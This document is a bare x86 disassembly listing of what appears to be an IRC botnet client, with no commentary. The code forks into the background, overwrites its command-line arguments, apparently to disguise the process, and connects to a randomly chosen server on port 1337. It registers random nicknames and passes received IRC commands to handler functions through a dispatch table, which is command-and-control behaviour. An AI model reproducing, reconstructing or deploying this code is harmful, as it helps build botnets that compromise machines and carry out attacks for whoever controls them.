add    DWORD PTR [ebp-0x18],0x1
mov    edx,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [ebp-0x10]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x40],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x40]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804bd28 <_352+0x1ba>
mov    eax,DWORD PTR [ebp-0x18]
add    eax,DWORD PTR [ebp-0x10]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804bcf3 <_352+0x185>
mov    eax,DWORD PTR [ebp-0x18]
add    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [eax],0x0
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp],eax
call   8048998 <inet_addr@plt>
mov    DWORD PTR [ebp-0x1c],eax
mov    eax,DWORD PTR [ebp-0x1c]
cmp    eax,0xffffffff
jne    804bd93 <_352+0x225>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp],eax
call   8048c08 <gethostbyname@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jne    804bd79 <_352+0x20b>
mov    eax,ds:0x804eb60
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804d0a8
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    804bddb <_352+0x26d>
mov    eax,DWORD PTR [ebp-0xc]
mov    eax,DWORD PTR [eax+0xc]
mov    ecx,eax
mov    eax,DWORD PTR [ebp-0xc]
mov    eax,DWORD PTR [eax+0x10]
mov    edx,DWORD PTR [eax]
lea    eax,[ebp-0x1c]
mov    edi,eax
mov    esi,edx
cld    
rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
mov    eax,0x804e4e8
lea    edx,[eax+0x3]
lea    eax,[ebp-0x1c]
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [edx],al
mov    eax,0x804e4e8
lea    edx,[eax+0x2]
lea    eax,[ebp-0x1c]
add    eax,0x1
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [edx],al
mov    eax,0x804e4e8
lea    edx,[eax+0x1]
lea    eax,[ebp-0x1c]
add    eax,0x2
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [edx],al
mov    eax,0x804e4e8
mov    BYTE PTR [eax],0x0
mov    DWORD PTR ds:0x804e4ec,0x100
add    esp,0x50
pop    esi
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,ds:0x804e924
mov    DWORD PTR [esp],eax
call   8048a48 <free@plt>
call   804908d <makestring>
mov    ds:0x804e924,eax
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x24
mov    DWORD PTR [ebp-0x8],0x0
jmp    804be15 <_NICK+0x14>
add    DWORD PTR [ebp-0x8],0x1
mov    edx,DWORD PTR [ebp-0x8]
mov    eax,DWORD PTR [ebp+0xc]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x18],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x18]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804be46 <_NICK+0x45>
mov    eax,DWORD PTR [ebp-0x8]
add    eax,DWORD PTR [ebp+0xc]
movzx  eax,BYTE PTR [eax]
cmp    al,0x21
jne    804be11 <_NICK+0x10>
mov    eax,DWORD PTR [ebp-0x8]
add    eax,DWORD PTR [ebp+0xc]
mov    BYTE PTR [eax],0x0
mov    eax,ds:0x804e924
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048b38 <strcasecmp@plt>
test   eax,eax
jne    804be9b <_NICK+0x9a>
mov    eax,DWORD PTR [ebp+0x10]
movzx  eax,BYTE PTR [eax]
cmp    al,0x3a
jne    804be75 <_NICK+0x74>
add    DWORD PTR [ebp+0x10],0x1
mov    eax,ds:0x804e924
test   eax,eax
je     804be8b <_NICK+0x8a>
mov    eax,ds:0x804e924
mov    DWORD PTR [esp],eax
call   8048a48 <free@plt>
mov    eax,DWORD PTR [ebp+0x10]
mov    DWORD PTR [esp],eax
call   8048bf8 <strdup@plt>
mov    ds:0x804e924,eax
add    esp,0x24
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x38
jmp    804bea9 <con+0x8>
mov    DWORD PTR ds:0x804e920,0xffffffff
mov    DWORD PTR [ebp-0x20],0x1
mov    eax,ds:0x804e4e0
test   eax,eax
jne    804bee6 <con+0x45>
call   8048bd8 <rand@plt>
mov    edx,eax
mov    eax,ds:0x804e3c0
mov    ecx,eax
mov    eax,edx
sar    edx,0x1f
idiv   ecx
mov    eax,edx
mov    eax,DWORD PTR [eax*4+0x804e3c4]
mov    ds:0x804ea48,eax
mov    DWORD PTR ds:0x804e4e0,0x0
mov    DWORD PTR [esp+0x8],0x6
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    ds:0x804e920,eax
mov    eax,ds:0x804e920
test   eax,eax
js     804bef0 <con+0x4f>
mov    eax,ds:0x804ea48
mov    DWORD PTR [esp],eax
call   8048998 <inet_addr@plt>
test   eax,eax
je     804bf3d <con+0x9c>
mov    eax,ds:0x804ea48
mov    DWORD PTR [esp],eax
call   8048998 <inet_addr@plt>
cmp    eax,0xffffffff
jne    804bf97 <con+0xf6>
mov    eax,ds:0x804ea48
mov    DWORD PTR [esp],eax
call   8048c08 <gethostbyname@plt>
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    804bf6f <con+0xce>
mov    DWORD PTR ds:0x804ea48,0x0
mov    eax,ds:0x804e920
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
jmp    804bea9 <con+0x8>
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [eax+0xc]
mov    ecx,eax
lea    eax,[ebp-0x1c]
lea    edx,[eax+0x4]
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x8],ecx
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
jmp    804bfa7 <con+0x106>
mov    eax,ds:0x804ea48
mov    DWORD PTR [esp],eax
call   8048998 <inet_addr@plt>
mov    DWORD PTR [ebp-0x18],eax
mov    WORD PTR [ebp-0x1c],0x2
mov    DWORD PTR [esp],0x539
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x1a],ax
mov    edx,DWORD PTR ds:0x804e920
lea    eax,[ebp-0x20]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x5421
mov    DWORD PTR [esp],edx
call   8048a68 <ioctl@plt>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x8],eax
jmp    804c0d7 <con+0x236>
call   80488f8 <__errno_location@plt>
mov    DWORD PTR [eax],0x0
lea    eax,[ebp-0x1c]
mov    edx,DWORD PTR ds:0x804e920
mov    DWORD PTR [esp+0x8],0x10
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048938 <connect@plt>
test   eax,eax
je     804c02a <con+0x189>
call   80488f8 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
cmp    eax,0x6a
jne    804c0b3 <con+0x212>
mov    eax,ds:0x804e920
mov    DWORD PTR [esp+0x10],0x0
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0xd
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],eax
call   8048bc8 <setsockopt@plt>
mov    eax,ds:0x804e920
mov    DWORD PTR [esp+0x10],0x0
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x2
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],eax
call   8048bc8 <setsockopt@plt>
mov    eax,ds:0x804e920
mov    DWORD PTR [esp+0x10],0x0
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x9
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],eax
call   8048bc8 <setsockopt@plt>
jmp    804c10b <con+0x26a>
call   80488f8 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
cmp    eax,0x73
je     804c0cb <con+0x22a>
call   80488f8 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
cmp    eax,0x72
jne    804c0ef <con+0x24e>
mov    DWORD PTR [esp],0x1
call   8048ba8 <sleep@plt>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
sub    eax,DWORD PTR [ebp-0x8]
cmp    eax,0x9
jbe    804bfee <con+0x14d>
mov    DWORD PTR ds:0x804ea48,0x0
mov    eax,ds:0x804e920
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
jmp    804bea9 <con+0x8>
leave  
ret    
lea    ecx,[esp+0x4]
and    esp,0xfffffff0
push   DWORD PTR [ecx-0x4]
push   ebp
mov    ebp,esp
push   edi
push   ebx
push   ecx
sub    esp,0x19ec
mov    DWORD PTR [ebp-0x19d0],ecx
call   8048bb8 <fork@plt>
test   eax,eax
je     804c13e <main+0x31>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    edx,DWORD PTR [ebp-0x19d0]
mov    eax,DWORD PTR [edx+0x4]
mov    eax,DWORD PTR [eax]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x19d4],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x19d4]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
lea    edx,[eax-0x1]
mov    ecx,DWORD PTR [ebp-0x19d0]
mov    eax,DWORD PTR [ecx+0x4]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],0x804d122
mov    DWORD PTR [esp],eax
call   80489a8 <strncpy@plt>
mov    DWORD PTR [ebp-0x38],0x1
jmp    804c1eb <main+0xde>
mov    eax,DWORD PTR [ebp-0x38]
shl    eax,0x2
mov    edi,DWORD PTR [ebp-0x19d0]
add    eax,DWORD PTR [edi+0x4]
mov    eax,DWORD PTR [eax]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x19d8],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x19d8]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
lea    edx,[eax-0x1]
mov    eax,DWORD PTR [ebp-0x38]
shl    eax,0x2
mov    ecx,DWORD PTR [ebp-0x19d0]
add    eax,DWORD PTR [ecx+0x4]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],0x0
mov    DWORD PTR [esp],eax
call   8048a08 <memset@plt>
add    DWORD PTR [ebp-0x38],0x1
mov    eax,DWORD PTR [ebp-0x38]
mov    edi,DWORD PTR [ebp-0x19d0]
cmp    eax,DWORD PTR [edi]
jl     804c191 <main+0x84>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    ebx,eax
call   8048948 <getpid@plt>
xor    ebx,eax
call   8048ac8 <getppid@plt>
lea    eax,[ebx+eax*1]
mov    DWORD PTR [esp],eax
call   8048928 <srand@plt>
call   804908d <makestring>
mov    ds:0x804e924,eax
call   804908d <makestring>
mov    ds:0x804e92c,eax
call   804908d <makestring>
mov    ds:0x804ea44,eax
mov    DWORD PTR ds:0x804eb60,0x804d127
mov    DWORD PTR ds:0x804ea40,0x804d12c
mov    DWORD PTR ds:0x804ea48,0x0
jmp    804c25b <main+0x14e>
call   804bea1 <con>
mov    eax,ds:0x804ea44
mov    edx,DWORD PTR ds:0x804e92c
mov    ecx,DWORD PTR ds:0x804e924
mov    ebx,DWORD PTR ds:0x804e920
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],edx
mov    DWORD PTR [esp+0x8],ecx
mov    DWORD PTR [esp+0x4],0x804d134
mov    DWORD PTR [esp],ebx
call   8048e47 <Send>
jmp    804c295 <main+0x188>
mov    eax,0x0
mov    ecx,0x20
lea    edi,[ebp-0x1c0]
cld    
rep stos DWORD PTR es:[edi],eax
mov    DWORD PTR [ebp-0x24],ecx
mov    DWORD PTR [ebp-0x20],edi
mov    eax,ds:0x804e920
mov    edx,eax
shr    edx,0x5
mov    eax,ds:0x804e920
and    eax,0x1f
bts    DWORD PTR [ebp+edx*4-0x1c0],eax
mov    DWORD PTR [ebp-0x140],0x4b0
mov    DWORD PTR [ebp-0x13c],0x0
mov    eax,ds:0x804e920
lea    edx,[eax+0x1]
lea    eax,[ebp-0x140]
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x0
lea    eax,[ebp-0x1c0]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048b48 <select@plt>
test   eax,eax
jle    804c25b <main+0x14e>
mov    DWORD PTR [ebp-0x28],0x0
jmp    804c41d <main+0x310>
mov    eax,DWORD PTR [ebp-0x28]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x8],0x1
mov    DWORD PTR [esp+0x4],0x0
mov    DWORD PTR [esp],eax
call   8048ad8 <waitpid@plt>
test   eax,eax
jle    804c419 <main+0x30c>
mov    eax,DWORD PTR [ebp-0x28]
add    eax,0x1
mov    DWORD PTR [ebp-0x18],eax
jmp    804c38a <main+0x27d>
mov    eax,ds:0x804e928
lea    edx,[eax-0x4]
mov    eax,DWORD PTR [ebp-0x18]
shl    eax,0x2
lea    ecx,[edx+eax*1]
mov    eax,DWORD PTR [ebp-0x18]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ecx],eax
add    DWORD PTR [ebp-0x18],0x1
mov    eax,ds:0x804e4f0
cmp    DWORD PTR [ebp-0x18],eax
jb     804c361 <main+0x254>
mov    eax,ds:0x804e928
lea    edx,[eax-0x4]
mov    eax,DWORD PTR [ebp-0x18]
shl    eax,0x2
lea    eax,[edx+eax*1]
mov    DWORD PTR [eax],0x0
mov    eax,ds:0x804e4f0
sub    eax,0x1
mov    ds:0x804e4f0,eax
mov    eax,ds:0x804e4f0
shl    eax,0x2
add    eax,0x4
mov    DWORD PTR [esp],eax
call   8048b78 <malloc@plt>
mov    DWORD PTR [ebp-0x1c],eax
mov    DWORD PTR [ebp-0x18],0x0
jmp    804c3fa <main+0x2ed>
mov    eax,DWORD PTR [ebp-0x18]
shl    eax,0x2
mov    ecx,eax
add    ecx,DWORD PTR [ebp-0x1c]
mov    eax,DWORD PTR [ebp-0x18]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ecx],eax
add    DWORD PTR [ebp-0x18],0x1
mov    eax,ds:0x804e4f0
cmp    DWORD PTR [ebp-0x18],eax
jb     804c3d7 <main+0x2ca>
mov    eax,ds:0x804e928
mov    DWORD PTR [esp],eax
call   8048a48 <free@plt>
mov    eax,DWORD PTR [ebp-0x1c]
mov    ds:0x804e928,eax
add    DWORD PTR [ebp-0x28],0x1
mov    eax,ds:0x804e4f0
cmp    DWORD PTR [ebp-0x28],eax
jb     804c324 <main+0x217>
mov    eax,ds:0x804e920
mov    edx,eax
and    edx,0x1f
mov    eax,ds:0x804e920
shr    eax,0x5
bt     DWORD PTR [ebp+eax*4-0x1c0],edx
setb   al
test   al,al
je     804c295 <main+0x188>
mov    eax,ds:0x804e920
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x1000
lea    edx,[ebp-0x19c0]
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],eax
call   8048988 <recv@plt>
mov    DWORD PTR [ebp-0x10],eax
cmp    DWORD PTR [ebp-0x10],0x0
jle    804c25b <main+0x14e>
mov    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [ebp+eax*1-0x19c0],0x0
mov    DWORD PTR [esp+0x4],0x804d15d
lea    eax,[ebp-0x19c0]
mov    DWORD PTR [esp],eax
call   8048b98 <strtok@plt>
mov    DWORD PTR [ebp-0x14],eax
jmp    804c65c <main+0x54f>
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048ff7 <filter>
mov    eax,DWORD PTR [ebp-0x14]
movzx  eax,BYTE PTR [eax]
cmp    al,0x3a
jne    804c541 <main+0x434>
mov    DWORD PTR [ebp-0x10],0x0
jmp    804c4cf <main+0x3c2>
add    DWORD PTR [ebp-0x10],0x1
mov    edx,DWORD PTR [ebp-0x10]
mov    eax,DWORD PTR [ebp-0x14]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x19dc],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x19dc]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804c506 <main+0x3f9>
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0x14]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804c4cb <main+0x3be>
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0x14]
mov    BYTE PTR [eax],0x0
mov    eax,DWORD PTR [ebp-0x14]
add    eax,0x1
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x9c0]
mov    DWORD PTR [esp],eax
call   8048af8 <strcpy@plt>
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0x14]
add    eax,0x1
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048af8 <strcpy@plt>
jmp    804c54c <main+0x43f>
lea    eax,[ebp-0x9c0]
mov    WORD PTR [eax],0x2a
mov    DWORD PTR [ebp-0x10],0x0
jmp    804c559 <main+0x44c>
add    DWORD PTR [ebp-0x10],0x1
mov    edx,DWORD PTR [ebp-0x10]
mov    eax,DWORD PTR [ebp-0x14]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x19e0],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x19e0]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    804c590 <main+0x483>
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0x14]
movzx  eax,BYTE PTR [eax]
cmp    al,0x20
jne    804c555 <main+0x448>
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0x14]
mov    BYTE PTR [eax],0x0
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x5c0]
mov    DWORD PTR [esp],eax
call   8048af8 <strcpy@plt>
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0x14]
add    eax,0x1
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048af8 <strcpy@plt>
mov    DWORD PTR [ebp-0x10],0x0
jmp    804c619 <main+0x50c>
mov    eax,DWORD PTR [ebp-0x10]
mov    edx,DWORD PTR [eax*8+0x804e480]
lea    eax,[ebp-0x5c0]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048b38 <strcasecmp@plt>
test   eax,eax
jne    804c615 <main+0x508>
mov    eax,DWORD PTR [ebp-0x10]
mov    ecx,DWORD PTR [eax*8+0x804e484]
mov    edx,DWORD PTR ds:0x804e920
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp+0x8],eax
lea    eax,[ebp-0x9c0]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   ecx
add    DWORD PTR [ebp-0x10],0x1
mov    eax,DWORD PTR [ebp-0x10]
mov    eax,DWORD PTR [eax*8+0x804e480]
test   eax,eax
jne    804c5cf <main+0x4c2>
mov    DWORD PTR [esp+0x4],0x804d15f
lea    eax,[ebp-0x5c0]
mov    DWORD PTR [esp],eax
call   8048b38 <strcasecmp@plt>
test   eax,eax
je     804c25b <main+0x14e>
mov    DWORD PTR [esp+0x4],0x804d15d
mov    DWORD PTR [esp],0x0
call   8048b98 <strtok@plt>
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0x0
je     804c295 <main+0x188>
mov    eax,DWORD PTR [ebp-0x14]
movzx  eax,BYTE PTR [eax]
test   al,al
jne    804c4ad <main+0x3a0>
jmp    804c295 <main+0x188>
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
pop    ebp
ret    
lea    esi,[esi+eiz*1+0x0]
lea    edi,[edi+eiz*1+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
call   804c6f9 <__i686.get_pc_thunk.bx>
add    ebx,0x1c21
sub    esp,0x1c
call   80488d0 <_init>
lea    eax,[ebx-0xe0]
mov    DWORD PTR [ebp-0x10],eax
lea    eax,[ebx-0xe0]
sub    DWORD PTR [ebp-0x10],eax
sar    DWORD PTR [ebp-0x10],0x2
mov    edx,DWORD PTR [ebp-0x10]
test   edx,edx
je     804c6f1 <__libc_csu_init+0x61>
xor    edi,edi
mov    esi,eax
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp+0x10]
add    edi,0x1
mov    DWORD PTR [esp+0x8],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   DWORD PTR [esi]
add    esi,0x4
cmp    DWORD PTR [ebp-0x10],edi
jne    804c6d0 <__libc_csu_init+0x40>
add    esp,0x1c
pop    ebx
pop    esi
pop    edi
pop    ebp
ret    
mov    ebx,DWORD PTR [esp]
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x804e1dc
sub    esp,0x4
mov    eax,ds:0x804e1dc
cmp    eax,0xffffffff
je     804c722 <__do_global_ctors_aux+0x22>
sub    ebx,0x4
call   eax
mov    eax,DWORD PTR [ebx]
cmp    eax,0xffffffff
jne    804c716 <__do_global_ctors_aux+0x16>
add    esp,0x4
pop    ebx
pop    ebp
ret    
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x4
call   804c734 <_fini+0xc>
pop    ebx
add    ebx,0x1b88
call   8048c90 <__do_global_dtors_aux>
pop    ecx
pop    ebx
leave  
ret    
